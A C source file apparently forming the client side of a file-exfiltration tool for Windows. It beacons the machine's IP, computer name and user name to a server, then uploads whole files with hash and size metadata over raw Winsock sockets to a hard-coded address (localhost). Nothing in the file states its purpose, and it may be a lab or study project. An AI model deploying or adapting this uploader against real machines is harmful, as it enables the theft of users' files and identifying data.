#include "commun.h"


#define BUFFER_SIZE 1024

#define SERVER_IP "127.0.0.1"

#define SERVER_PORT_DIR 8080

#define SERVER_PORT_FILE 8081




void ConnectToServer(const char* ip, const char* computerName, const char* userName) {
    WSADATA wsa;
    SOCKET s;
    struct sockaddr_in server;
    char message[BUFFER_SIZE];

    // Initialize winsock
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        printf("Failed to initialize Winsock. Error Code : %d", WSAGetLastError());
        return;
    }

    // Create a socket
    if ((s = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET) {
        printf("Could not create socket : %d", WSAGetLastError());
        return;
    }

    server.sin_addr.s_addr = inet_addr(SERVER_IP);
    server.sin_family = AF_INET;
    server.sin_port = htons(SERVER_PORT_DIR);

    // Connect to remote server
    if (connect(s, (struct sockaddr*)&server, sizeof(server)) < 0) {
        puts("Connect error");
        closesocket(s);
        WSACleanup();
        return;
    }

    // Format and send the message
    snprintf(message, BUFFER_SIZE, "{\"ip\":\"%s\",\"computerName\":\"%s\",\"userName\":\"%s\"}", ip, computerName, userName);

    if (send(s, message, strlen(message), 0) < 0) {
        puts("Send failed");
        closesocket(s);
        WSACleanup();
        return;
    }

    closesocket(s);
    WSACleanup();
}



void SendDataToServer(const char* filePath, BYTE* fileHash, const char* ip, const char* computerName, const char* userName) {
    WSADATA wsaData;
    SOCKET clientSocket;
    struct sockaddr_in server;

    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        fprintf(stderr, "\nWSAStartup failed. Error Code : %d\n", WSAGetLastError());
        return;
    }

    clientSocket = socket(AF_INET, SOCK_STREAM, 0);
    if (clientSocket == INVALID_SOCKET) {
        fprintf(stderr, "\nCould not create socket : %d\n", WSAGetLastError());
        return;
    }

    server.sin_addr.s_addr = inet_addr(SERVER_IP);
    server.sin_family = AF_INET;
    server.sin_port = htons(SERVER_PORT_FILE);

    if (connect(clientSocket, (struct sockaddr*)&server, sizeof(server)) < 0) {
        fprintf(stderr, "\nConnect error. Error Code : %d\n", WSAGetLastError());
        return;
    }

    FILE* file = fopen(filePath, "rb");
    if (file == NULL) {
        fprintf(stderr, "\nFile could not be opened.\n");
        return;
    }

    fseek(file, 0, SEEK_END);
    long fileSize = ftell(file);
    fseek(file, 0, SEEK_SET);

    char fileHashStr[65];
    for (int i = 0; i < 32; i++) {
        snprintf(fileHashStr + i * 2, 3, "%02x", fileHash[i]);
    }

    char json[8192];
    snprintf(json, sizeof(json), "{\"ip\":\"%s\",\"computerName\":\"%s\",\"userName\":\"%s\",\"fileHash\":\"%s\",\"filePath\":\"%s\",\"fileSize\":\"%ld\"}", ip, computerName, userName, fileHashStr, filePath, fileSize);

    int jsonSize = strlen(json);

    // Send the size of the JSON data first (converted to network byte order)
    int jsonSizeToSend = htonl(jsonSize);
    send(clientSocket, (char*)&jsonSizeToSend, sizeof(jsonSizeToSend), 0);
    printf("[+] jsonSize = %d\n", jsonSize);
    printf("[+] json : \n%s\n", json);
    // Send the JSON data
    send(clientSocket, json, jsonSize, 0);

    // Read file content into a buffer
    char* fileBuffer = (char*)malloc(fileSize);
    if (fileBuffer == NULL) {
        fprintf(stderr, "\nMemory allocation error.\n");
        fclose(file);
        return;
    }
    fread(fileBuffer, 1, fileSize, file);

    // Send the file data
    send(clientSocket, fileBuffer, fileSize, 0);

    free(fileBuffer);
    fclose(file);
    closesocket(clientSocket);
    WSACleanup();

    printf("\n[+] File sent successfully.\n");
}